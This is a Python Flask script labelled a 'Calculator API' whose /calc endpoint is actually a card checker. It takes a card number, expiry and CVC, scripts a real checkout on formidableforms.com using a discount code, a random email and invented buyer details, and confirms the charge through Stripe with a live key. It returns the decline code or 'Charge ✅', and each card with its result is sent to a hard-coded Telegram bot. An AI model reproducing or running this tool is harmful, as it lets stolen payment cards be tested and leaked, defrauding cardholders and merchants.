import requests,random,string
from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route("/")
def home():
    return jsonify({"message": "Calculator API is running"})
    
    
    
    
def random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domains = ["gmail.com", "yahoo.com", "outlook.com"]
    return f"{name}@{random.choice(domains)}",name

s = requests.Session()
def ch(c):
	cc=c.split('|')[0]
	exp=c.split('|')[1]
	exy=c.split('|')[2]
	try:
		exy=exy[2]+exy[3]
	except:
		pass
	cvc=c.split('|')[3]
	url = "https://formidableforms.com/checkout"
	params = {
	  'edd_action': "add_to_cart",
	  'download_id': "28029934",
	  'edd_options[price_id]': "1",
	  'discount': "50OFF"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'referer': "https://formidableforms.com/pricing/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	}
	
	
	response = s.get(url, params=params, headers=headers)
	
	url = "https://formidableforms.com/checkout/"
	
	params = {
	  'discount': "50OFF"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'upgrade-insecure-requests': "1",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'referer': "https://formidableforms.com/pricing/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	}
	
	response = s.get(url, params=params, headers=headers,cookies=s.cookies)
	pageid=(response.text.split('name="page_id" value=')[1].split('"')[1])
	nonce=(response.text.split('data-stripe-nonce=')[1].split('"')[1])
	url = "https://formidableforms.com/wp-admin/admin-ajax.php"
	
	params = {
	  'payment-mode': "stripe"
	}
	
	payload = {
	  'action': "edd_load_gateway",
	  'edd_payment_mode': "stripe",
	  'nonce': nonce,
	  'current_page': pageid
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://formidableforms.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://formidableforms.com/checkout/?discount=50OFF",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	}
	
	response = s.post(url, params=params, data=payload, headers=headers,cookies=s.cookies)
	dt=(response.text.split('data-timestamp=')[1].split('"')[1])
	no=(response.text.split('name="edd-process-checkout-nonce" value=')[1].split('"')[1])
	tok=(response.text.split('data-token=')[1].split('"')[1])
	cr=random_email()
	em=cr[0]
	user=cr[1]
	url = "https://api.stripe.com/v1/payment_methods"
	payload = {
	  'billing_details[email]': em,
	  'billing_details[name]': "Mohamed+Sarah",
	  'type': "card",
	  'card[number]': cc,
	  'card[cvc]': cvc,
	  'card[exp_year]': exy,
	  'card[exp_month]': exp,
	  'allow_redisplay': "unspecified",
	  'payment_user_agent': "stripe.js/d91f4a8494;+stripe-js-v3/d91f4a8494;+payment-element;+deferred-intent;+autopm",
	  'referrer': "https://formidableforms.com",
	  'time_on_page': "31927",
	  'client_attribution_metadata[client_session_id]': "87334134-9f40-4fd0-8931-931216c95c78",
	  'client_attribution_metadata[merchant_integration_source]': "elements",
	  'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
	  'client_attribution_metadata[merchant_integration_version]': "2021",
	  'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
	  'client_attribution_metadata[payment_method_selection_flow]': "automatic",
	  'client_attribution_metadata[elements_session_id]': "elements_session_1hsM6ebyUNE",
	  'client_attribution_metadata[elements_session_config_id]': "2ecfd486-4263-41b6-9f03-45d1730861a8",
	  'client_attribution_metadata[merchant_integration_additional_elements][0]': "payment",
	  'guid': "7583706e-32c2-4729-a5f5-b2fd25a6c1c1982e5b",
	  'muid': "c89d4235-e898-4d9b-bfe9-5fa4097cf59597b721",
	  'sid': "090b1eeb-f7b4-4c9d-84fc-28015a9a758a17c5f7",
	  'key': "pk_live_417iELvM68h9V1Gr4hQKhK4IEA5sZZuLsmGbEVNLiLlAzntPCxeXfJ5WsSSNq5yDvP3IqIXRBu0OAdwcmsf3WE7nP00SZo4UfOd",
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://js.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://js.stripe.com/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	idd=(response.json()['id'])
	url = "https://formidableforms.com/wp-admin/admin-ajax.php"
	
	payload = {
	  'edd_email': em,
	  'edd_phone': '+441539496555',
	  'edd_first': 'Catherine',
	  'edd_last': 'Shaw',
	  'edd_user_login': em,
	  'edd_user_pass': user,
	  'edd_user_pass_confirm': user,
	  'edd-purchase-var': 'needs-to-register',
	  'edd_pro_ip': '156.263.67.85',
	  'payment-mode': 'stripe',
	  'page_id': pageid,
	  'edd-gateway': 'stripe',
	  'edd-process-checkout-nonce': no,
	  'action': 'edds_process_purchase_form',
	  'timestamp': dt,
	  'token': tok,
	  'intent_type': '',
	  'intent_id': '',
	  'intent_fingerprint': '',
	  'payment_method[id]': idd,
	  'payment_method[object]': 'payment_method',
	  'payment_method[allow_redisplay]': 'unspecified',
	  'payment_method[billing_details][address][city]': '',
	  'payment_method[billing_details][address][country]': '',
	  'payment_method[billing_details][address][line1]': '',
	  'payment_method[billing_details][address][line2]': '',
	  'payment_method[billing_details][address][postal_code]': '',
	  'payment_method[billing_details][address][state]': '',
	  'payment_method[billing_details][email]': em,
	  'payment_method[billing_details][name]': 'Catherine Shaw',
	  'payment_method[billing_details][phone]': '',
	  'payment_method[billing_details][tax_id]': '',
	  'payment_method[card][brand]': 'mastercard',
	  'payment_method[card][checks][address_line1_check]': '',
	  'payment_method[card][checks][address_postal_code_check]': '',
	  'payment_method[card][checks][cvc_check]': '',
	  'payment_method[card][country]': 'US',
	  'payment_method[card][display_brand]': 'mastercard',
	  'payment_method[card][exp_month]': exp,
	  'payment_method[card][exp_year]': '20'+exy,
	  'payment_method[card][funding]': 'debit',
	  'payment_method[card][generated_from]': '',
	  'payment_method[card][last4]': '4838',
	  'payment_method[card][networks][available][0]': 'mastercard',
	  'payment_method[card][networks][preferred]': '',
	  'payment_method[card][regulated_status]': 'unregulated',
	  'payment_method[card][three_d_secure_usage][supported]': 'true',
	  'payment_method[card][wallet]': '',
	  'payment_method[created]': '1781321851',
	  'payment_method[customer]': '',
	  'payment_method[customer_account]': '',
	  'payment_method[livemode]': 'true',
	  'payment_method[shared_payment_granted_token]': '',
	  'payment_method[type]': 'card'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://formidableforms.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://formidableforms.com/checkout/?discount=50OFF",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  
	}
	
	response = s.post(url, data=payload, headers=headers,cookies=s.cookies)
	intent_id=(response.json()['data']['intent_id'])
	client_secret=(response.json()['data']['client_secret'])
	url = "https://api.stripe.com/v1/payment_intents/"+intent_id+"/confirm"
	
	payload = {
	  'use_stripe_sdk': "true",
	  'mandate_data[customer_acceptance][type]': "online",
	  'mandate_data[customer_acceptance][online][infer_from_client]': "true",
	  'return_url': f"https://formidableforms.com/checkout/purchase-confirmation/?payment_intent={intent_id}&redirect_status=processing",
	  'payment_method': idd,
	  'key': "pk_live_417iELvM68h9V1Gr4hQKhK4IEA5sZZuLsmGbEVNLiLlAzntPCxeXfJ5WsSSNq5yDvP3IqIXRBu0OAdwcmsf3WE7nP00SZo4UfOd",
	  'client_attribution_metadata[client_session_id]': "87334134-9f40-4fd0-8931-931216c95c78",
	  'client_attribution_metadata[merchant_integration_source]': "l1",
	  'client_secret': client_secret
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://js.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://js.stripe.com/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	try:
		return response.json()['error']['decline_code']
	except:
		return 'Charge ✅'
@app.route("/calc", methods=["GET"])
def chk():
    # قراءة المتغير
    O = request.args.get("cc")
    try:
        y = ch(O)
    except Exception as e:
        return f"Error: {e}", 500

    requests.get(
            f"https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage"
            
            f"?chat_id=6689099522&text={O}|{y}"
        )
    return (
        f"{y}"
    )


# لتشغيله محليًا
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)